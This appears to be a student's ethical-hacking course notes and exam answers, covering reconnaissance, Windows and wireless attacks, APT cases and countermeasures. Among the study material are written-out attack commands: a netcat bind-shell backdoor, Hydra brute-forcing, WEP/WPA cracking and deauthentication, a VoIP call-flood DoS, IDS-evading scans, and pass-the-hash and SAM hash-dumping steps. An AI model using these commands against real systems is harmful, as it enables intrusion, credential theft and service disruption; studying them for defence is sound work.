# Footprinting
- Determine the scope of your activities
- Get proper authorization
- Publicly available information
- WHOIS & DNS enumeration
- DNS interrogation
- Network reconnaissance

## What to footprint ? 
- **Internet**: domain names, network blocks and subnets, IP addresses, TCP/UDP services, CPU arch, access control, IDS, system enumeration, DNS hostnames
- **Intranet**: network protocols, internal domain names, network blocks, IP addresses, TCP/UDP services, CPU arch, access control, IDS, system enumeration
- **Remote access**: phone numbers, remote system type, authentication mechanisms, VPN
- **Extranet**: domain names, connection source and destination, type of connection, access control

based on three step:
1. Determine the scope of your activities (Entire organization or subsidiaries?)
1. Get proper authorization (Get-out-of-jail-free card)
1. Publicly available information
1. WHOIS and DNS Enumeration (DOmain names, IP addr, port number stored WHOIS/DNS server)
1. DNS interrogation
1. Network Reconnaissance

## DNS interrogation
Obtain revealing info about the organization by querying DNS servers (domain name <-> IP addresses)
```nslookup, ls -d, <domain name>```; or dig  
+ norecurse, examines only the local dns data. ANSWER: 0 <- EXAMPLE. If i run again the command ANSWER:1. So we can see if someone has queried the site. And we also know the ip af a domain

**DNS SECURITY COUNTERMEASURE**: Restrict zone transfer to only authorized servers, Configure a firewall to deny unauthorized inbound connections to TCP port 53(DNS), Configure not to provide internal DNS info

## Network Reconnaissance
Recreate network topology and access path diagram with ```traceroute, tracert, NeoTrace```     

**COUNTERMESAURE**: IDS ```snort,bro```, Configure border routers to limit ICMP and UDP traffic to specific systems

# Scanning 
1. Determine if the system is alive 
1. Wich services are running/listening 
1. Detecting OS.

## Determine alive system
With network ping sweeps: 
- using **ARP** (on the same subnet) ```Arp-scan``` or ```nmap -PR -sn``` or ```CAIN```
- using **ICMP**  ```ping``` or ```nmap -PE|PP|PM ```
- using **tcp/udp** ```superscan``` or ```nmap```

nmap not only send an ICMP ECHO REQUEST it also perform an ARP ping. (attenction to IPS).
other command nmap:

```nmap -sL 100.100.1.1-254 # search host alive *nmbotto de casino fa eh rumore*```.  
```nmap -sS -sV <ip> # find services and version  ``` 

**PING SWEEP COUNTERMEASURES**: IDS, FIrewall  
**PREVENTION**: ACL in firewall: limit ICMP traffic into your networks or systems, Allow only ECHO_REPLY, HOST UNREACHABLE, TIME EXCEEDED into specific hosts in DMZ; allow only ISP’s specific IP addresses

## Determining Which Services Are Running or Listening
Port scanning. Scan types:
- ```nmap -sT ``` TCP connect scan (3-way handshake), 
- ```nmap -sS ``` TCP SYN scan (half-open scan,SYN then SYN/ACK or RST/ACK), 
- ```nmap -sF ``` TCP FIN scan (RST if closed port), 
- ```nmap -sX ``` TCP Xmas Tree scan (FIN/URG/PUSH), 
- ```nmap -sN ``` TCP null scan, 
- ```nmap -sA ``` TCP ACK scan, 
- ```nmap -sW ``` TCP Windows scan, 
- ```nmap -sU ``` UDP scan (ICMP port unreachable msg, if closed port)
- ```nmap -f  ``` **fragment packets to pass firewall/IDS**

**COUNTERMEASURES**:
 - **DETECTION**: snort, scanlogs, Firewalls(detect SYN scans but ignore FIN scans)
 - **PREVENTION**: Disabling all unnecessary services/ports
 
## Detecting The Operating System
basically make guess from avaiable ports:
- **Windows**: ports 135, 139, 445 (139 only for Windows 95/98); 3389 for RDP (Remote Desktop Protocol)
- **UNIX**: TCP 22 (SSH), TCP 111 (RPC portmapper=port 135), TCP 512-514 (Berkeley Remote services, rlogin), TCP 2049 (NFS, Network File System), 3277x (RPC, Remote Procedure Call in Solaris)
- ```nmap –O ```
**COUNTERMEASURES**:
 - **DETECTION**: snort, scanlogs,
 - **PREVENTION**: secure proxy or firewall, Active Defence

# Enumeration
- Service fingerprinting
- Vulnerability scanners
- Banner grabbing
- Enumerating common network services

## Scanning vs. Enumeration
- Level of intrusiveness
- Enumeration: active connections to systems and directed queries

**Enumerated Info**
- User account names
- Misconfigured shared files
- **Older software versions with known vulnerabilities**

**Manual vs. automatic**: Stealth vs. efficiency

**Nmap version scanning**
- nmap-services (mapping ports to services)
- nmap-service-probe (known service responses -> known protocol and version)

## Basic Banner Grabbing
**Manual**  
- ```telnet www.example.com 80```
- Generic to work on many common applications on standard ports, e.g. HTTP (80), SMTP (25), FTP (21)

**Automatic**
- ```netcat``` or ```nc```
- Redirect an input file of requests to nc

## NetBIOS Name Service, UDP 137
Microsoft's name service, DNS-like NET VIEW can list the domains, or the computers in each domain: ```net view /domain```. Normally NBNS only works on the local network segment but it is possible to route NBNS over TCP/IP, allowing enumeration from a remote system. Tools for doing that **NMBscan in Kali Linux**.

```nbtscan-1.0.33.exe -f 192.168.1.0/24```

## SNMP, UDP 161
Simple Network Management Protocol **(Security Not My Problem)**. SNMP is intended for network management and monitoring It provides inside information on net devices, software and systems. Administrators use SNMP to remotely manage routers and other network devices. SNMP has a minimal security system called SNMP Community Strings, community strings act like passwords. The MIB (Management Information Bases) contains a SNMP device's data in a tree-structured form, like the Windows Registry. **Vendors add data to the MIB, Microsoft stores Windows user account names in the MIB**.

### Data Available Via SNMP Enumeration
- Running services
- Share name
- Share paths
- Comments on shares
- Usernames
- Domain name

**SMTP** enum tools, ```snmputil``` from the Windows NT Resource , ```snmpget``` or ```snmpwalk``` for Linux (netsnmp suite)

**SNMP Enumeration Countermeasures** 
- Remove or disable unneeded SNMP agents
- Change the community strings to non-default values
- Block access to TCP and UDP ports 161 (SNMP GET/SET) at the net perimeter devices
- Restrict access to SNMP agents to the appropriate management console IP address



# APT (Advanced Persisten Threats)
Example 
- Operation Aurora
- Anonymous
- RBN

Uses of advanced methods (0day, custom exploit) to attack. Are persistent because the attack stop after long time and threats because are organized, motivated etc.
Non APT attacks are against targets of opportunity. APT -> Long-term goals, used to steal a large amount of data in a long time. APT goal **Obtain and mantain access to information**. APT attack don't destroy system or interrupt normal operation. Techniques: dropper delivery services, SQL injection to add malware to wesites, infected USB stik "**drops**" infected HW or SW, social engineering, impersonating users. Hide file (linux file name '.. '), RAM drives ```sudo mount -t ramfs -o size=512M ramfs /tmp/ram/```, to see ram drives use ```df -a```.

## APT methods of attack
1. Spear-phishing email
2. User click link; open an hidden application and redirect hydden data
3. Hidden address in a Dropsite, detect browser vulnerabilities, and drop a trojan downloader.
4. Downloader sends a base64-encoded instruction to a different dropsite, which install a trojan backdor
1. Backdoor installed  in \windows\system32  and register in NETSVCS
1. Trojan backdors names slightly different from windows filenames
1. Uses SSL communication with C&C server
1. Attacker interact  cia cutouts with trojan with SSL-encrypted traffic
1. Attacker list computername and User accounts; user pass the hash get local and active direcory acount information
1. Service privilege escalation to netw recoinassance
1. Offline password hash cracking
1. lateral movements by using RDP, SC.exe (to create service) or NET commands(to connect to shares)
1. install additional backdoors Trojans, and ingress point
1. Stolen files are pakaged in ZIP files or RAR pakages, renamed as GIFs

## Detecting APT
- audit changes to filesistem
- SMS alert on administrative logind
- Firewall that montor inbound RDP/VNC/CMD.EXE
- AV, HIPS, filesystem integrity checking
- NIDS, NIPS
- Security informations, Event managements (SIEM)

## Historical APT Campaigns

### Operation Aurura 2009
**Targets**: U.S. Technology and Defense Industries ( 32 companies lost data over a period as long as six months)
- Google
- Juniper
- Adobe

### Method Spear-Phishing and RAT
1. Email with a link to a Taiwanese website with malicious JavaScript
  - Exploited Internet Explorer vunerability
  - Undetected by antivirus
1. Trojan Downloaders placed on victim computers
1. Installed a Backdoor Trojan Remote Administration Tool (RAT)
 - Accessed through SSL

**China?** Spear-phishing and downloader linked to Taiwan. Backdoor Command & Control servers were traced to two schools in China. No proof that Chinese government or industry sponsored or supported the attacks

### Anonymous
From 2011, a loosely affiliated group or collection of groups, to expose sensitive info to public or interrupt services (DOS)

**hacking techniques** SQL injection, cross-site scripting, web service vulnerability exploits, social engineering (targeted spear-phishing, imitating employees like help desk personnel).

**Targets**: Government agencies at all levels, Sony, Bay Area Rapid Transit (BART), Mastercard & Visa.
**Goals**: Demonstrate that people can strike back at powerful organizations, Expose corruption, Primary goal: expose information (Not to use it for competitive or financial gain).

### Ghost Attack
GhostRAT used in the "Ghostnet" attacks 2008-2010. Targeted the Dalai Lama (Tibetan Government-in-Exile in India, London and New York City) and other Tibetan enterprises

#### Summary of Gh0st Attack
- Phishing email
- Backdoor placed when malicious link clicked
- Backdoor hides itself to survive a reboot
- Connection to C&C
- Check internal domain, create accounts, use Terminal Server to hop to other hosts (Event Logs)
- Add/modify some files (diff \System32)
- Look for documents and zip for exfiltration
- Create a 2nd backdoor using netcat
- Create user account and execute FTP (Windows Security Event Log)
- Schedule a new job to clean logs everyday

## Order of Volatility (survive to reboot)
1. memory
1. page swap
1. running process information
1. network data such listening port or existing connectionsto other system
1. System Registry
1. System or application log files
1. forensic images of disk
1. bakup media

## Forensic Tools copied to CD-ROM
- AccessDataFTK Imager
- Sysinternals autoruns
- Sysinternals process explorer
- Sysinternals process monitor
- CurrPorts

**Memory Dump Analysis**, crucial for APT analysis because many APT methods use process injection or obfuscation, analyzing RAM data guarantees that the data are unencrypted.
**FTK Imager**: select the Capture Memory option, select an external mass-storage device as the output folder.

**Pagefile/Swapfile Analysis** **TOOLS**: Using Volatility Framework Tool (open source) to analyze memory:
- Processes
- Network connections
- DLLS from suspicious process
- Use strings on the DLL



# Eth Windows
## Reasons for windows Securoty problems
First of all: Backward Compatibility. Is very important at buisnesses, enabled by default and causes many security problems. Than we have a proliferation of features and so we have an average of 70 MS securoity bllettin per year.


## unauthenticated attacks (Vectors for hack windows) 
- Authentication spoofing (password)
- Network services
- Client software Vulnerabilities
- Device driver  
**Protect these areas**

### Authentication spoofing attacks
Traditional services to attack are: 
- SMB (Server Message Block 445/tcp,139/tcp), 
- MSRPC (Microsoft Remote Procedure Call 135/tcp), 
- Terminal services 3389/tcp, SQL 1443/tcp,1434/udp, 
- share point and web services 80,443.  
**how**  
- Bruteforce-> we all know... (**HYDRA**) ```-l Username -L Username list -p Pass -P Pass list -t Limit concurrent conn -V Verbose -f Stop on correct login -s Port```. 

**Countermeasures**: firewall, disable SMB, enforce password, account lockout threshold, enable **audit** account logon failures, **Use all of them**.
- Sniffing on network password exchange. You can sniff LM hash (lan manager easy to crack), Kerberosh pkt. All with **CAIN**.


**Three authentication protocols:**
- LM (lan manager with hash **BRUTTO**)
- NTLM (with encryotion)
- Kerberos (provate and optional publick key encryption)  
### **Attack tools -> CAINKermSniff etc...**: sniffing, bruteforce, dictionary. Attack MITM.

### Kerberos
Send a preauthentication packet which contains a timestamps encrypted with a key derived from the user's password. An offline attack can on that exchange can reveal a weak password 

### authentication sniffing countermeasures
Disable LM authentication. NT LAN manager (NTLM) hashes are harder to crack. Pick good passwords. Use public key encryption. Use built-in windows IPsec to authenticate and encrypt password.

### MITM Countermeasure
If attacker alredy in your lan, very hard. Use authenticated and encrypted protocols,  enforce them with group policy and firewall rules, verify identity os remote server with strong authentication or trusted third parties.

### Pass-the-hash
1. Compromise a machine
1. Dump password hashes stored in **RAM**
1.Use them as credentials for network services whitout cracking them.  
This allow to **compromise a network** after compromising a single machine. **Administrator** loged in the machine before also taken.  
**HOW?**  
**Windows Credential Editor** (WCE)-> dump in-memory username, domain, LM & NTLM hashes. Is a single esecutable (wce.exe) very easy. Support Windows: XP, 2003, vista, 7, 2008. Password are encrypted but **keys are stored in RAM**. Dump existing Kerberos RAM tickets and reuse them. WCE can reply and re-use tickets, but you must compromise a host first.

### Pass-the-hash countermeasures
NTLM vulnerable by design; no countermeasures. **Prevent intrusion first**, if possible two factor authentication.

### Remote unauthencicated expoit (METASPLOIT)
... no comment ...
### Metasploit countermeasures 
Apply patch quickly, audit, log and monitor traffic.

### Device driver exploit.
METASPLOIT but more fun (hight prov mode by driver).


## Authenticated attacks
Privilege escalation (SISTEM is MORE powerful os ADMIN account). Preventing Privilege escalation Keep Win machines patched. **Extracting and cracking passwords** after obltained win machines -> penetrate deeper into the network-> paswordssss (post exploitation disable firewall).

### Grabbing Password Hashesssssss
Local user in windows security accounts manager (SAM) under NT4 and earlier. SAM == SHADOW files for windows.  
Stored in ```%systemroot%\system32\config\SAM``` but **it's locked as long as the OS is running**. It's also in the Registry key ```HKEY_LOCAL_MACHINE\SAM```. How to get hashes? Easy, use **CAIN** (cracker tab-> right click-> add to list). **Cain inject a DLL (shared libraries) into a hight privilege process** in a running system. Other way to get the hashes, boot target system to an alternate OS and copy SAM file. 

### Cracking hash
NTLM hard to break but earlier version (XP an before) still use LM (wheak). **Windows doesn't salt its hash!** pffff. So speed up password cracking with raimbow tables

### Backdoors

```psexec \\10.1.1.1 -u Administrator -password -s cmd.exe  ```
or  
```nc -l -e cmd.exe -p 8080 #ez rekt ``` 
```telnet <ip> 8080 # attacker  ```
 
 ### hide file
 - attrib +h filename (set hidden bit)
 - alterbate data stream (ADS)
 ```echo 'robe' > out.txt ```   
 ```echo 'segreto' > out.txt:hidden.txt```  

 same size.  
 Best way to hide file -> Rootkits

## windows system compromised, how to recover? guidelines.
**You shuld just reinstall it completely**  
If you want to clean it, cover four areas: Files, Registry keys, Processes and Network ports.
### Search for suspicius files
known dangerous filename like nc.exe, run antivirus, use tripwire or other tools that tools that identify
changes to system files. 
### Suspicius registry entries
Look for regisry keys that start known backdoors like:
 - ```HKEY_USERS\.DEFAULT\Software\ORL\WINVNC3```
 - ```HKEY_LOCAL_MACHINE\SOFTWARE\Net Solutions\NetBus Server```
**use reg delete to remove**
**Backdor favourite autostart (extensibility points (ASEPs))**
 - **HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run**
### Suspicius Processes
Malicius porocess whit CPU utilization, end process or kill to stop. Check scheduler queue: shctasks, task sheduler.
### Suspicius Ports
Use **netstat -aon** to vew network connections.
### Windows security features
Windows firewall, automated updates

# Remote connectivity and VoIP
- Dial-up hack
- Voicemail Hacking
- PBX (Private Branch Exchange) Hacking
- Virtual private network haking
- Coice over IP attacks
many companies still use dial-up connections (connecting to old server). Dial up hacking is similar to other hacking (footprint, scan, enumerate, exploit), automated by tools: wardialer or demo dialer. Phone number 

footprinting: identify blocks of phone to load into a wardialer.  

**Bruteforce Voicemail Hacking**, is similar to dial-up hacking metods. Required components. Tools Voicemail box hacker 3.0, VrACK 0.51. 

**Countermeasures** deploy a lockout on failed attempts; log observe voicemail connections.  

## Voicemail Hacking
Brute-force Voicemail Hacking. In similar fashion to dial-up hacking methods. Required components: phone number to access voicemail; target voicemail box (3~5 digits); educated guess about voicemail box password (typically only numbers)

**TOOLS**: ```Voicemail Box Hacker 3.0``` and ```VrACK 0.51``` (for old/less-secure system), ASPECT scripting language.

**COUNTERMEASURES**: deploy a lockout on failed attempts; log/observe voicemail connections

## VPN hacking
VPN has replaced dial-up as the remote access mechanism. 

**GOOGLE HACKING** Using **filetipe:pcf** to find profile setting files for Cisco VPN client
1. download and import
1. connect and attack. 

Password stored in PCF file can be used for password reuse attack (tools cain etc). 

**COUNTERMEASURES**: user awareness; sanitize sensitive information on websites; use Google Alerts service

### Probing IPsec
Check if service’s corresponding port is available (UDP 500). Perform IPsec VPN identification and gateway fingerprinting. Identify the IKE Phase 1 mode and remote server hardware.

**TOOLS**: Nmap, NTA Monitor, IKEProber

### Attacking IKE Aggressive Mode
IKE Phase 1-Aggressive mode does not provide a secure channel (Eavesdropping attacks to authentication information).
1. identify whether target server supports aggressive mode (tool: IKEProbe)
1. initiate connection and capture authentication messages (tool: IKECrack, Cain)

 **COUNTERMEASURES**: discontinue IKE Aggressive mode use; use token-based authentication scheme.

### VoIP Attacks
- **VoIP Enumeration** provide detail and owerview of the setup: VoIP gateway/server, IP-PBK system, client software(softphone)/VoIP phone and user extension [command to do this: ```svmap.py <IP-RANGE-TO-SCAN>(search phone/PBX) and svwar.py -e<RANGE-EXTENSION> <IP-TO_SCAN> -m INVITE (search extension)```]. 

- **With DOS** we can attack a sigle phone or multiple phone. To perform this attack we just must send a large colume of fake call (SIP INVITE) to the victim or flooding the phone with unwanted traffic (COMMAND:``` inviteflood <INTERFACE> <USER(EXTENSION)> <TARGET-DOMAIN> <IP-TARGET> <NUM_OP_PACKET>```, and the phone continusly ring now).

- **Interceprion attacks**: sniff VoIP datastream with wireshark or make an arpSpoofing attack with dsniff to capture the RTP stream. Than we must recognize the codec of the datasream and than convert datastream to popular file types (TOOLS: scapy or vomit) 

**COUNTERMEASURE** for this attacks are to segmenting the network between voice and  data VLANs, authentication and enryption for all SIP communication, deploy IPS or IDS 


# Wireless tech and hacking

## **Equipment for attack**
- NIC that support promicuous mode -> (Alfa AWUS050NH, Ralink RT2270F chipset)
- Windows (easy find driver, bad hack tools) or **Linux** (hard to get drivers but hacking tools are much better) **KALI** or **PARROT**
- Antennas
    - Omnidirectional
    - Directional
- And more...

## Background on IEEE 802.11 wireless lan
ISM(Industrial, Scentific, Medical) unlicensed bands. 2.4v GHz->802.11 b/g/n channels 1-14 (non overlapping channels 1,6,11), 5Ghz->802.11 a/n channels 36-165 (all non overlapping).

## Session establishment
Most common mode just uses an access point. Ad Hoc devices connected peer-to-peer (like ethernet crossover cable). 

**PROBES** Client send a probe request for the SSID it is looking for, it repeat this request for each channel for a response from the SSID (**probe response**). Afterthe response client sends **authentication request**. 

If system use open authentication the AP accept any connection. The alternate system, **shared-key authentication**, is almost never used (used only in WEP). The WPA security mechanism have no effect on authentication, they take effect later. 

**ASSOCIATION** client send **association request** and AP sends an **associationresponse**.

### Security mechanism
**MAC filtering** or **Hidden network** (omit SSID from beacons). CLient can send a **broadcast probe requests** and do not specify the SSID (APs can be configured to ignore them)


## WEP
WEP is the first standard IEEE 802.11 for secure the trasmission in wi-fi network. His vulnerability is due to Inizialization Vectors (IV) 24bit. It uses the RC4 as algorithm and two keys 64 or 128 bit (actual 40 and 104 bit 24 if IV).

### Methods of authentication for WEP
- **Open System authentication**, the WLAN client does not provide its credentials to the Access Point during authentication. Any client can authenticate with the Access Point and then attempt to associate. In effect, no authentication occurs. Subsequently, WEP keys can be used for encrypting data frames. At this point, the client must have the correct keys.
- **Shared Key authentication**, the WEP key is used for authentication in a four-step challenge-response handshake:
    1. The client sends an authentication request to the Access Point.
    1. The Access Point replies with a clear-text challenge.
    1. The client encrypts the challenge-text using the configured WEP key and sends it back in another authentication request.
    1. The Access Point decrypts the response. If this matches the challenge text, the Access Point sends back a positive reply.
After the authentication and association, the pre-shared WEP key is also used for encrypting the data frames using RC4.

At first glance, Shared Key authentication seem more secure than Open System authentication, since the OpenSysAuth offers no real authentication. However, it is quite the reverse. It is possible to derive the keystream used for the handshake by capturing the challenge frames in Shared Key authentication. Therefore, data can be more easily intercepted and decrypted with Shared Key authentication than with Open System authentication. 

When we have enough IVs (5000 for 40bit and 60000 for 104) we will end with two packet with same IV, caused by the short lenght of IV. If this happens we can try to use **airckrack-ng** wich uses statistical attacks to determine key stream. It will be able to determine the key.

### weak of WEP
Because **RC4** is a **stream cipher**, the **same traffic key must never be used twice**. The purpose of an IV, which is transmitted as plain text, is to prevent any repetition, but a **24-bit IV is not long enough to ensure this on a busy network**. The way the IV was used also opened WEP to a related key attack. For a 24-bit IV, there is a 50% probability the same IV will repeat after 5,000 packets.

### ATTACK WEP 
1. card in monitor mode
1. ```airodump-ng wlan0``` (to searck a network with wep)
1. ```airodump-ng --bssid xx:xx:xx:xx:xx:xx --channel xx --write test-ap-dump wlan0``` (to sniff and store the traffic of that network in the file test-ap-dump)
1. ```airckrack-ng test-ap-dump-01.cap```
1. wait 

#### COUNTERMEASURE WEP DON'T USE WEP EVER

## WPA vs. WPA2
802.11i specifies encryption standards.
- WPA implements only part of 802.11i -> TKIP (Temporal Key Integrity Protocol)
- WPA2 instead impelemts both -> TKIP and AES (Advanced encryption standards)

## WPA

### WPA-personal aka WPA-PSK
Designed after WEP to address all issues that made WEP very easy to crack. The main issue with WEP is the short IV, wich is sent in plain text. In WPA however each packet is encrypted using unique temporary key. So doesen't matter how much traffic we sniff, because they do not contain any useful information that can help to crack the key same for WPA2. **the only difference between WPA and WPA2 is that WPA2 uses an algorithm calles CCMP for encrytpion.
On **WPA personal or WPA-PSK** we have one password for all the users. Password storen in the wireless client and if the password is changed on AP we must change manually form all the devices connected at the AP and **Wireless access cannot be individually managed**.

The only packets that contains information that can help us to determine the key are the handshake packets. These are the four packets sent when a new device or a new client connects to the targhet network. Using **airckrack-ng** we can use a wordlist, testing each password in the wordlist using the handshake.

### ATTACK WPA-PSK
1. capturing the handshake 
    - ```airodump-ng --bssid xx:xx:xx:xx:xx:xx --channel xx --write test-handshake wlan0```

1. if we dont find any handshake we can cause them with deauth attack
    - ```aireplay-ng --deauth 4 -a xx:xx:xx:xx:xx:xx<AP MAC> -c xx:xx:xx:xx:xx:xx<MAC CLIENT DEAUTH> wlan0```

1. crack the key with dictionary
    - ```aircrack-ng test-handshake-01.cap -w wordlist```


### WPA-Enterprise
Also referred to as WPA-802.1X mode, this is **designed for enterprise networks** and requires a RADIUS authentication server. This requires a more complicated setup, but provides additional security (e.g. protection against dictionary attacks on short passwords). Various kinds of the Extensible Authentication Protocol (EAP) are used for authentication. WPA-Enterprise mode is available with both WPA and WPA2. When users try to connect to Wi-Fi, they need to present their enterprise login credentials. Users never deal with the actual encryption keys. Attackers cannot get the network key from clients and offers individualized control over access to a Wi-Fi network.

#### WPA-PSK VS. 802.1x (Enterprise)
**WPA-PSK** uses pre-shared key. **WPA-Enterprise 802.1x** uses 802.1x and a RADIUS server, EAP (Extesible Authentication Protocol), which may be one of: EAP-TTLS, PEAP, EAP-FAST. Both WPA-PSK and WPA-Enterprise use Four way handshake to establish: Pairwise transient key (used for unicast communications), Group tempral key (used for multicast and broadcat communications). 

Three Encryption Options: 
1. **WEP** -> use RC4 and easily exploitable. 
1. **TKIP** -> quick replacement for WEP (runs on old hardware), still use RC4 but no major vulnerabilities are known. 
1. **AES-CCMP** -> (Advanced Encryption Standard with Ciper Block Chainig Message Authentication Protocol) most secure reccomended.

### ATTAKING WPA ENTERPRISE
This means to attack EAP (Extensible Authentication Protocol). Tecniques depends on the specific EAP type used (LEAP or EAP-TTLS and PEAP). First must detect the type of EAP with wireshark.

###  1 LEAP 
Leap is a proprietary protocol from Cisco Systems developed in 2000 to address the security weakness common in WEP. Is an 102.1x schema using a RADIUS server.
**Is fundamentally weak because it provides ZERO RESISTANCE to offline  dictionary attack**. It solely rely on MS-CHAPv2 to protect the user credential usedfor wireless LAN authentications. **But MS-CHAPv2 is notoriously weak** because it does not use salt in NT hashes, use a weak 2 byte DES key and sends usernames in clear text. Because of this offline dictionary and bruteforce attack can be made much more efficient.

**TOOL**: **asleep** offline brute-force attack with LEAP handshake and wordlist

**COUNTERMEASURE**: LEAP is secure if the passwords are long and complex but avoid using LEAP just like WEP

### 2 EAP-TTLS and PEAP
EAP-TTLS and PEAP both use a TLS tunnel to protect a less secure inner authenticated protocol (MS-CHAPv2, EAP-GTC (one-time passwords), Cleartext).
**attacking TLS** (no known way to defeat the encryption), but AP impersonation can work.
- Trick target into connecting to MITM instead of server
- Misconfigured clients won't validate the identity of the RADIUS server so it can be spoofed
- FreeRADIUS-WPE: accepts any connections and outputs data to a log.

**SUMMARY**: Act as a terminating end of the TLS tunnel, if the client is misconfigured not to check the identity of RADIUS server -> access inner auth protocol

**TOOL**: hostapd (Turn your card into an AP), asleep (offline brute-force on inner authentication protocol)

**COUNTERMEASURE**: "Validate the Server Certificate" on all wireless clients

### Identifying Wireless Network Defenses
- SSID can be forund from mainly these packets (Beacons, Probe request, Probe responses, Association and Reassociation Requests)
    - IF SSID broadcasting is off, just deauthenticate all to force reassociation.
- MAC address control (Each MAC must be entered into the list of approved addresses)
    - Sniff for users search for the mac of one user and spoof
    - ```macchanger -m xx:xx:xx:xx:xx:xx [interface]```


## Summary wireless hacking
- WEP
    - Passive attacks and ARP reply with fake with fake authentication 
    - cracked in 5 min
    - **DO NOT USE IT NEVER**
- WPA-PSK
    - could be brute-forced, trough high complexity 
    - one PSK fits all -> put other user at risk
- WPA enterprise
    - LEAP
        - could be brute-forced, needs extremely complex passwords
        - **DONT USE IT** 
    - EAP-TTLS and PEAP
        - relatively secure with multilayered encryption
        - subject to AP impersonations and MITM attacks
        - **always have client check server chertificate**


# Questions of past exams

 ## Describe at least one technique to determine which services are running or listening on a remote host. Discuss pro and cons, and which tools you may use in practice.
 For determine which service are running on a remote host we can need to scan the port that are listening in that system. There are many tools for do this, for example there are 'nmap' and 'nc' (netcat). Nmap can search for alive hosts, listening ports, os detection and more. Nmap if not configured well can be very noisy on the network even it support many types of scan techniques. For example with 'nmap -sS -sV <host>' we can look for listening services that are running on the host and their version. Or we can just listening the traffic generated in a network to look for standard port and some useful information. Obviously in the first case from the fact that we generate traffic, we can be blocked from some IPS that can recognize our scan if we are not careful to configure the type of scan that we want use. Instead with a passive sniffing we are more stealth but we can not found as many information that we can do with nmap. 

## Describe at least one attack method to gain remote access on a UNIX system.
After we have scanned a system and we have a list of services that are running in the system that we want attack, we can search for some know exploit (CVEs) for that services. If there is some useful explot, such as "arbitrary code execution" or some "buffer overflow" we can use metasploit to get some access into the system. Metasploit is a framework that can search for known CVEs and can launch exploit with specific payloads or can try to execute a brute-force attack onto some services such as SSH or TELNET. Or if we obtain in some way the shadow and the passwd files, maybe with some path traversal and some backup files, we can crack the hash of the users if they have weak password with hashcat or johntheripper. Hashcat and Johntheripper are two tools that can be used for bruteforce or doing some dictionary attack for crack an hash (in this case the password of users).

## Describe at least one attack method to gain root access. Discuss pro and cons.
After we have obtained a local access we can search fore some escalation privilege. For example we can search for SUID files. Or some script shell or bash that can be rewrite that are executed from crontab as a root. Or we can search from some program that search for shared libraries that we can replace with a malicious one. There are many methods, we can search for some exploit that can lead us to a some privilege escalation. Usually they are caused by misconfiguration or an non updated system.For example if we can find a program that is run with suid bit (4xxx) the program is executed with the privilege of the owner. So is the owner is the root and if we can use in some ways that file (rewrite, give him some input) we have a file that runs with root privileges. Or if we have some program that search for some shared libraries, if we can write where this libraries are we can replace one libraries with one that contain some code that can launch a shell and if the program is executed as root ( cronjob ) we can have a shell with root privileges.

## Describe at least one method for attacking WPA. Which countermeasures can be used?
WPA have no major weaknesses until 2017, however, if you use a weak pre shared key, it can be found with a dictionay attack. But PSK is hashed 4096 times, can be up 63 characters long, and include the SSID. We can use  aircrack.ng or pyrit to try crack the key. Some countermeasures are use another standard WPA2-PSK or use wery strong preshared key. Major weakness one shared key for all the user.

## Explain differences between Cross-Site scripting and Cross Site Request Forgery. Which countermeasures can be used?
XSS can lead to an arbitrary execution of javascript code into the victim browser. It can be possible because the website was not written very well. CSRF allows an attacker to induce a victim user to perform actions that they not want to do. One countermeasures to CSRF is use some token to verify the identity of the user. Instead for XSS we can filter input on arrival, use appropriate response header, check for error in programming for the website page, sanification the input.

## Discuss the differences between scanning and enumeration. Describe at least one enumeration technique.
When we scan we search for alive host, for listening services that running or listening and for detecting the os. we can do it with nmap and many other tools. Using ARP or ICMP or TCP/UDP host discovery for see if an host is alive. For detecting the services instead we make port scan, TCP connect(SYN, SYN-ACK, ACK), TCP SYN scan (SYN, SYN-ACK or RST-ACK) and many more methods. Instead enumerating is when we lookup for service fingherprint, we search for vulnerabilities, banner grabbing, and enumerating common service nework. For example we can do both using nmap. **'nmap -sL 100.100.1.1-254'** search for alive host in the specified range, **'nmap -sS -sV host.ip'** this command do an syn scan (-sS) and search for version of processes running into the remote machine (-sV).

##  imagine there has been an APT attack on a Windows machine. Which files would you look at, in search of interesting information for digital forensics, to understand what happened? Tell the default locations of the files, what information they contain and which tools you can use for your analysis.
SAME BOTTOM 

## The Administrator account of a Windows server has been compromised. Host software cannot be re-installed for business reasons. With these assumptions, how do you plan and implement post-exploit activities for the host recovery. In particular, list the areas of the system on which to intervene, to restore the host’s security. Discuss in detail at least one of these areas of intervention, listing the activities to be carried out, the tools, the line commands to be used, etc.
If you want to clean it without reinstall all you must cover four areas: files, registry keys, processes, network ports.   
Search in the system for some dangerous filename such as 'nc.exe', run antivirus, use some tools that identify some changes to the filesystem and system files.   
Look for registry keys that lauch some backdoors (WINVNC3 and NetBus server) and delete them using reg delete.   
Search for extensibility points (ASEPs)**HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run**.   
Then searh for process with CPU utilization, kill them to stop, check scheduler queue (shctasks and task sheduler).   
For look the port that are listening launch **netstat -aon** . Finally check for firewall and autoupdate.  

scan search in four areas: files, registry keys, processes, network ports 


## Describe the SQL injection technique in web applications. Discuss the possible countermeasures. Describe at least one automated SQL injection tool.
A SQL injection is a securoty exploit that allow an attacker to add a SQL query as input in a web form to gain unauthorized access to a SQL database. To check if there is some SQLinjection we can use special character such as ' # " to see if the website retur us an error. Then we can manipulate the input to change the final query and to make own custom query. We can now use INFORMATION_SCHEMA tables to map the database. One tool to automate SQLinjection is 'sqlmap'. The most important countermeasure is that programmers must make input sanitization. Use mysql_real_escape_string(). If a number is expected check is really a number.

SQL injection -> allow an attacker to add a SQL query as input in a web form to gain unauthorized access to a SQL database -> search for # and ' see an error -> make own query ->  use INFORMATION_SCHEMA tables to map the database -> The most important countermeasure is that programmers must make input sanitization. Use mysql_real_escape_string(). If a number is expected check is really a number. 

## Symlink. What are symlinks and how do they work? How can an attacker exploit symlinks (provide an example)? Describe at least one countermeasure.
Symlinks are pointer from one file to another. They are completely transparent to application and user, and creating symlinks does not requires permission. Anyone can create a symlink with: ls -s PATH_FILE ./LINK_TO_FILE . Can be exploited by trick a program to use some undesidered files. For example if crontab lauch some file regularly as root we can trick crontab to execute any script as root referencing to them or we can feed an program with some file es /etc/shadow and take advantage of some bad code that can print for us the shadow file if the program does not recognize the sintax, maybe he expect a particular syntax of a log file and since it does not recognize the syntax, it prints the line to indicate that there is an error. We can create a symlink if we have the right to write in the folder. There are some countermeasure to that. Set permission to write in a directory. 

